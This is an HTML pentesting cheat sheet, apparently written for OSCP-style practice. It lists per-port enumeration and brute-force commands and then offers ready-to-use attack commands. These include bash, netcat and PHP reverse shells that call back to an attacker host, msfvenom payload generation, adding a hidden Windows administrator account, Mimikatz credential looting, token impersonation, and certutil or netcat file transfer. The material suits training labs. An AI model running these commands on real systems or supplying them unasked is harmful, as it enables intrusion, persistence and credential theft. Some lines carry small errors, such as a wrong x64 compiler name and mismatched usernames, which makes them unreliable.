<h1 class="code-line" data-line-start=0 data-line-end=1 ><a id="1_Enumeration_0"></a>1. Enumeration</h1>
<h2 class="code-line" data-line-start=1 data-line-end=2 ><a id="Intital_Scanning_1"></a>Intital Scanning</h2>
<p class="has-line-data" data-line-start="2" data-line-end="3">First run an asynchronous port scan on the box to find the ports of interest.</p>
<pre><code class="has-line-data" data-line-start="5" data-line-end="11" class="language-bash"><span class="hljs-comment"># Standard</span>
unicornscan <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># Full Range</span>
unicornscan <span class="hljs-variable">$RHOST</span>:<span class="hljs-number">0</span>-<span class="hljs-number">65535</span>
</code></pre>
<p class="has-line-data" data-line-start="12" data-line-end="13">Second, run a slower, synchronous scans with scripts.</p>
<h2 class="code-line" data-line-start=14 data-line-end=15 ><a id="Port_21__FTP_14"></a>Port 21 - FTP</h2>
<pre><code class="has-line-data" data-line-start="16" data-line-end="24" class="language-bash">ftp <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># Anonymous login</span>
nmap --script=ftp-anon -p <span class="hljs-number">21</span> <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># Bruteforce logins</span>
nmap --script=ftp-brute -p <span class="hljs-number">21</span> <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=25 data-line-end=26 ><a id="Port_25__SMTP_25"></a>Port 25 - SMTP</h2>
<pre><code class="has-line-data" data-line-start="27" data-line-end="29" class="language-bash">nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-<span class="hljs-number">4344</span>, smtp-vuln-cve2011-<span class="hljs-number">1720</span>,smtp-vuln-cve2011-<span class="hljs-number">1764</span> -p <span class="hljs-number">25</span> <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=30 data-line-end=31 ><a id="Port_80__HTTP_30"></a>Port 80 - HTTP</h2>
<pre><code class="has-line-data" data-line-start="33" data-line-end="39" class="language-bash">nikto <span class="hljs-variable">$RHOST</span>

curl <span class="hljs-variable">$RHOST</span>/robots.txt

dirbuster
</code></pre>
<h4 class="code-line" data-line-start=39 data-line-end=40 ><a id="Wordpress_39"></a>Wordpress</h4>
<pre><code class="has-line-data" data-line-start="41" data-line-end="45" class="language-bash">nmap --script=http-wordpress* -p <span class="hljs-number">80</span> <span class="hljs-variable">$RHOST</span>

wpscan <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=46 data-line-end=47 ><a id="Port_110__POP3_46"></a>Port 110 - POP3</h2>
<pre><code class="has-line-data" data-line-start="48" data-line-end="55" class="language-bash">telnet <span class="hljs-variable">$RHOST</span> <span class="hljs-number">110</span>
    USER <span class="hljs-variable">$USER</span>
    PASS <span class="hljs-variable">$PASS</span>
    LIST
    RETR
    QUIT
</code></pre>
<h2 class="code-line" data-line-start=56 data-line-end=57 ><a id="Port_111__RPCBind_56"></a>Port 111 - RPCBind</h2>
<pre><code class="has-line-data" data-line-start="58" data-line-end="70" class="language-bash"><span class="hljs-comment"># List of services running RPC</span>
<span class="hljs-comment"># RPC can help find NFS-shares</span>
rpcbind -p <span class="hljs-variable">$RHOST</span>

rpcclient -U <span class="hljs-string">""</span> <span class="hljs-variable">$RHOST</span>
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
</code></pre>
<h2 class="code-line" data-line-start=71 data-line-end=72 ><a id="Port_135__MSRPC_71"></a>Port 135 - MSRPC</h2>
<pre><code class="has-line-data" data-line-start="73" data-line-end="84" class="language-bash"><span class="hljs-comment"># Micro$oft RPC port</span>
nmap <span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span> --script=msrpc-enum

rpcclient -U <span class="hljs-string">""</span> <span class="hljs-variable">$RHOST</span>
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
</code></pre>
<h2 class="code-line" data-line-start=85 data-line-end=86 ><a id="Port_139445__SMB_85"></a>Port 139/445 - SMB</h2>
<pre><code class="has-line-data" data-line-start="87" data-line-end="108" class="language-bash">enum4linux [-u <span class="hljs-variable">$USER</span>][-p <span class="hljs-variable">$PASS</span>] <span class="hljs-variable">$RHOST</span>

smbmap [-u <span class="hljs-variable">$USER</span>][-p <span class="hljs-variable">$PASS</span>] -H <span class="hljs-variable">$RHOST</span>

smbclient -L \\\\<span class="hljs-variable">$RHOST</span>\\<span class="hljs-variable">$SHARE</span> [-U <span class="hljs-variable">$USER</span>] [<span class="hljs-variable">$PASS</span>]

<span class="hljs-comment"># Find NetBIOS info</span>
nmblookup -A <span class="hljs-variable">$RHOST</span>

rpcclient -U <span class="hljs-string">""</span> -N <span class="hljs-variable">$RHOST</span>
    enumdomusers

<span class="hljs-comment"># Info dump</span>
nmap --script=smb-enum*.nse -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># OS discovery</span>
nmap --script=smb-os-discovery.nse -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># Scan for known vulnerabilties</span>
nmap --script=smb-vuln* -p <span class="hljs-number">139</span>,<span class="hljs-number">445</span> <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=109 data-line-end=110 ><a id="Port_161__SNMP_109"></a>Port 161 - SNMP</h2>
<pre><code class="has-line-data" data-line-start="111" data-line-end="119" class="language-bash">snmpwalk -c public -v1 <span class="hljs-variable">$RHOST</span>

snmpcheck -t <span class="hljs-variable">$RHOST</span> -c public

onesixtyone -c <span class="hljs-variable">$NAMES_FILE</span> -i <span class="hljs-variable">$RHOST_FILE</span>

snmpenum -t <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=120 data-line-end=121 ><a id="Port_443__HTTPS_120"></a>Port 443 - HTTPS</h2>
<pre><code class="has-line-data" data-line-start="122" data-line-end="124" class="language-bash">nmap <span class="hljs-operator">-s</span>V --script=ssl-heartbleed <span class="hljs-variable">$RHOST</span>
</code></pre>
<h2 class="code-line" data-line-start=125 data-line-end=126 ><a id="Port_2049__NFS_125"></a>Port 2049 - NFS</h2>
<pre><code class="has-line-data" data-line-start="127" data-line-end="134" class="language-bash"><span class="hljs-comment"># Enumeration</span>
showmount <span class="hljs-operator">-e</span> <span class="hljs-variable">$RHOST</span>

<span class="hljs-comment"># Mounting</span>
mount <span class="hljs-variable">$RHOST</span>:/ /tmp/NFS
mount -t <span class="hljs-variable">$RHOST</span>:/ /tmp/NFS
</code></pre>
<h2 class="code-line" data-line-start=135 data-line-end=136 ><a id="Port_5900__VNC_135"></a>Port 5900 - VNC</h2>
<pre><code class="has-line-data" data-line-start="137" data-line-end="139" class="language-bash">vncviewer <span class="hljs-variable">$RHOST</span>
</code></pre>
<h1 class="code-line" data-line-start=140 data-line-end=141 ><a id="2_Exploitation_140"></a>2. Exploitation</h1>
<h2 class="code-line" data-line-start=141 data-line-end=142 ><a id="MSFVenom_Reverse_Shell_Payloads_141"></a>MSFVenom Reverse Shell Payloads</h2>
<h3 class="code-line" data-line-start=142 data-line-end=143 ><a id="Generate_Payloads_142"></a>Generate Payloads</h3>
<pre><code class="has-line-data" data-line-start="145" data-line-end="147" class="language-bash">msfvenom -p <span class="hljs-variable">$PAYLOAD</span> LHOST=<span class="hljs-variable">$LHOST</span> LPORT=<span class="hljs-variable">$LPORT</span> [<span class="hljs-operator">-e</span> <span class="hljs-variable">$ENCODER</span> [-i <span class="hljs-variable">$ROUNDS</span>]] [-b <span class="hljs-variable">$BADCHARS</span>] [<span class="hljs-operator">-f</span> <span class="hljs-variable">$FORMAT</span>] [-o <span class="hljs-variable">$FILENMAE</span>]
</code></pre>
<h3 class="code-line" data-line-start=148 data-line-end=149 ><a id="Payloads_148"></a>Payloads</h3>
<table class="table table-striped table-bordered">
<thead>
<tr>
<th style="text-align:left">Windows</th>
<th style="text-align:right"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Staged</td>
<td style="text-align:right"><code>windows/shell/reverse_tcp</code></td>
</tr>
<tr>
<td style="text-align:left">Stageless</td>
<td style="text-align:right"><code>windows/shell_reverse_tcp</code></td>
</tr>
</tbody>
</table>
<table class="table table-striped table-bordered">
<thead>
<tr>
<th style="text-align:left">Linux</th>
<th style="text-align:right"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">32bit</td>
<td style="text-align:right"><code>linux/x86/shell_reverse_tcp</code></td>
</tr>
<tr>
<td style="text-align:left">64bit</td>
<td style="text-align:right"><code>linux/x64/shell_reverse_tcp</code></td>
</tr>
</tbody>
</table>
<h4 class="code-line" data-line-start=159 data-line-end=160 ><a id="Encoders_159"></a>Encoders</h4>
<p class="has-line-data" data-line-start="160" data-line-end="161"><code>x86/shikata_ga_nai</code></p>
<h2 class="code-line" data-line-start=162 data-line-end=163 ><a id="Bash_Reverse_Shells_162"></a>Bash Reverse Shells</h2>
<pre><code class="has-line-data" data-line-start="164" data-line-end="166" class="language-bash"><span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">196</span>;<span class="hljs-built_in">exec</span> <span class="hljs-number">196</span>&lt;&gt;/dev/tcp/<span class="hljs-variable">$LHOST</span>/<span class="hljs-variable">$LPORT</span>; sh &lt;&amp;<span class="hljs-number">196</span> &gt;&amp;<span class="hljs-number">196</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">196</span>
</code></pre>
<pre><code class="has-line-data" data-line-start="167" data-line-end="169" class="language-bash">bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$LHOST</span>/<span class="hljs-variable">$LPORT</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>
</code></pre>
<h2 class="code-line" data-line-start=170 data-line-end=171 ><a id="PHP_Reverse_Shells_170"></a>PHP Reverse Shells</h2>
<h3 class="code-line" data-line-start=171 data-line-end=172 ><a id="One_Liner_171"></a>One Liner</h3>
<pre><code class="has-line-data" data-line-start="173" data-line-end="175" class="language-php"><span class="hljs-preprocessor">&lt;?php</span> <span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$LHOST</span>,<span class="hljs-variable">$LPORT</span>); <span class="hljs-variable">$proc</span> = proc_open(<span class="hljs-string">"/bin/sh -i"</span>, <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">1</span>=&gt;<span class="hljs-variable">$sock</span>, <span class="hljs-number">2</span>=&gt;<span class="hljs-variable">$sock</span>), <span class="hljs-variable">$pipes</span>) <span class="hljs-preprocessor">?&gt;</span>
</code></pre>
<h3 class="code-line" data-line-start=175 data-line-end=176 ><a id="File_Upload_175"></a>File Upload</h3>
<p class="has-line-data" data-line-start="176" data-line-end="177">Kali File Location: <code>/usr/share/webshells/php/php-reverse-shell.php</code> &lt;sup&gt;&lt;sub&gt;[<a href="files/php-reverse-shell.php">archive</a>]</p>
<h2 class="code-line" data-line-start=178 data-line-end=179 ><a id="Netcat_Reverse_Shells_178"></a>Netcat Reverse Shells</h2>
<h3 class="code-line" data-line-start=179 data-line-end=180 ><a id="Unix_179"></a>Unix</h3>
<pre><code class="has-line-data" data-line-start="181" data-line-end="183" class="language-bash">nc <span class="hljs-operator">-e</span> /bin/sh <span class="hljs-variable">$LHOST</span> <span class="hljs-variable">$LPORT</span>
</code></pre>
<h3 class="code-line" data-line-start=184 data-line-end=185 ><a id="OpenBSD_184"></a>OpenBSD</h3>
<pre><code class="has-line-data" data-line-start="186" data-line-end="188" class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-variable">$LHOST</span> <span class="hljs-variable">$PORT</span> &gt;/tmp/f
</code></pre>
<h1 class="code-line" data-line-start=189 data-line-end=190 ><a id="3_PostExploitation_189"></a>3. Post-Exploitation</h1>
<h2 class="code-line" data-line-start=191 data-line-end=192 ><a id="Linux_191"></a>Linux</h2>
<h3 class="code-line" data-line-start=192 data-line-end=193 ><a id="Enumeration_Scripts_192"></a>Enumeration Scripts:</h3>
<ul>
<li class="has-line-data" data-line-start="193" data-line-end="195">
<p class="has-line-data" data-line-start="193" data-line-end="194"><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/LinEnum.sh">archive</a>]</p>
</li>
<li class="has-line-data" data-line-start="195" data-line-end="197">
<p class="has-line-data" data-line-start="195" data-line-end="196"><a href="https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py">linuxprivchecker.py</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/linuxprivchecker.py">archive</a>]</p>
</li>
<li class="has-line-data" data-line-start="197" data-line-end="199">
<p class="has-line-data" data-line-start="197" data-line-end="198"><a href="https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh">unix-privesc-check.sh</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/upc.sh">archive</a>]</p>
</li>
</ul>
<h2 class="code-line" data-line-start=199 data-line-end=200 ><a id="Windows_199"></a>Windows</h2>
<h3 class="code-line" data-line-start=200 data-line-end=201 ><a id="Enumeration_Scripts_200"></a>Enumeration Scripts</h3>
<ul>
<li class="has-line-data" data-line-start="201" data-line-end="203">
<p class="has-line-data" data-line-start="201" data-line-end="202"><a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py">windows-exploit-suggester.py</a>  &lt;sup&gt;&lt;sub&gt;[<a href="files/windows-exploit-suggester.py">archive</a>]</p>
</li>
<li class="has-line-data" data-line-start="203" data-line-end="205">
<p class="has-line-data" data-line-start="203" data-line-end="204"><a href="https://github.com/pentestmonkey/windows-privesc-check">windows-privesc-check</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/windows_privesc_check.py">archive</a>]</p>
</li>
<li class="has-line-data" data-line-start="205" data-line-end="207">
<p class="has-line-data" data-line-start="205" data-line-end="206"><a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/Sherlock.ps1">archive</a>]</p>
</li>
</ul>
<h3 class="code-line" data-line-start=207 data-line-end=208 ><a id="Resources_207"></a>Resources</h3>
<ul>
<li class="has-line-data" data-line-start="208" data-line-end="210"><a href="https://guif.re/windowseop">https://guif.re/windowseop</a></li>
</ul>
<h3 class="code-line" data-line-start=210 data-line-end=211 ><a id="Creating_Windows_Admin_Account_210"></a>Creating Windows Admin Account</h3>
<pre><code class="has-line-data" data-line-start="212" data-line-end="219" class="language-bash"><span class="hljs-comment"># Victim</span>
net user /add jack sparrow
net localgroup administrators jack /add

<span class="hljs-comment"># Connect with</span>
rdesktop -u jim -p sparrow [IP-ADDRESS]
</code></pre>
<h3 class="code-line" data-line-start=220 data-line-end=221 ><a id="Tokens_220"></a>Tokens</h3>
<p class="has-line-data" data-line-start="221" data-line-end="222">If you have admin, loot tokens &amp; creds with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
<p class="has-line-data" data-line-start="223" data-line-end="224">If you have a service account, and want root - try token impersonation!</p>
<ul>
<li class="has-line-data" data-line-start="225" data-line-end="226"><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a></li>
<li class="has-line-data" data-line-start="226" data-line-end="228"><a href="https://github.com/Re4son/Churrasco">Churrasco</a></li>
</ul>
<h3 class="code-line" data-line-start=228 data-line-end=229 ><a id="Using_Python_Scripts_without_Python_installed_228"></a>Using Python Scripts without Python installed</h3>
<p class="has-line-data" data-line-start="229" data-line-end="230"><a href="https://github.com/pyinstaller/pyinstaller">PyInstaller</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/PyInstaller-3.6.zip">archive</a>]</p>
<pre><code class="has-line-data" data-line-start="231" data-line-end="233" class="language-bash">pyinstaller yourprogram.py
</code></pre>
<h3 class="code-line" data-line-start=234 data-line-end=235 ><a id="Crosscompiling_for_Windows_234"></a>Cross-compiling for Windows</h3>
<pre><code class="has-line-data" data-line-start="237" data-line-end="243"># x86
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]

# x64
i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
</code></pre>
<h2 class="code-line" data-line-start=244 data-line-end=245 ><a id="Exfiltration_244"></a>Exfiltration</h2>
<ul>
<li class="has-line-data" data-line-start="246" data-line-end="247">SSH Copy (scp)</li>
</ul>
<pre><code class="has-line-data" data-line-start="248" data-line-end="250" class="language-bash">scp user@hostname:/path/to/src user@hostname:/path/to/dst
</code></pre>
<ul>
<li class="has-line-data" data-line-start="251" data-line-end="252">Netcat</li>
</ul>
<pre><code class="has-line-data" data-line-start="253" data-line-end="259" class="language-bash"><span class="hljs-comment"># Victim</span>
nc -nvlp <span class="hljs-variable">$RPORT</span> &gt; out.file

<span class="hljs-comment"># Kali</span>
nc -nv <span class="hljs-variable">$RHOST</span> <span class="hljs-variable">$RPORT</span> &lt; in.file
</code></pre>
<ul>
<li class="has-line-data" data-line-start="260" data-line-end="261">exe2bat</li>
</ul>
<pre><code class="has-line-data" data-line-start="262" data-line-end="265" class="language-bash"><span class="hljs-comment"># Convert a windows executable to a copy and paste set of commands</span>
wine $(locate exe2bat.exe) nc.exe nc.txt
</code></pre>
<ul>
<li class="has-line-data" data-line-start="266" data-line-end="267">certutil.exe</li>
</ul>
<pre><code class="has-line-data" data-line-start="268" data-line-end="270" class="language-bash">certutil.exe -urlcache -split <span class="hljs-operator">-f</span> “<span class="hljs-variable">$URL</span>” <span class="hljs-variable">$FILENAME</span>
</code></pre>
<ul>
<li class="has-line-data" data-line-start="271" data-line-end="272"><a href="files/zip.vbs">zip.vbs</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/zip.vbs.txt">copy&amp;paste</a>]</li>
</ul>
<pre><code class="has-line-data" data-line-start="273" data-line-end="275" class="language-bash">CScript zip.vbs <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span>
</code></pre>
<ul>
<li class="has-line-data" data-line-start="276" data-line-end="277"><a href="files/wget.vbs">wget.vbs</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/wget.vbs.txt">copy&amp;paste</a>]</li>
</ul>
<pre><code class="has-line-data" data-line-start="278" data-line-end="280" class="language-bash">CScript wget.vbs <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span>
</code></pre>
<h1 class="code-line" data-line-start=281 data-line-end=282 ><a id="Resources_281"></a>Resources</h1>
<p class="has-line-data" data-line-start="282" data-line-end="286"><a href="https://sushant747.gitbooks.io/total-oscp-guide/">https://sushant747.gitbooks.io/total-oscp-guide/</a><br>
<a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a><br>
<a href="https://guif.re/windowseop">https://guif.re/windowseop</a><br>
<a href="https://github.com/rafiherm/OSCP">https://github.com/rafiherm/OSCP</a></p>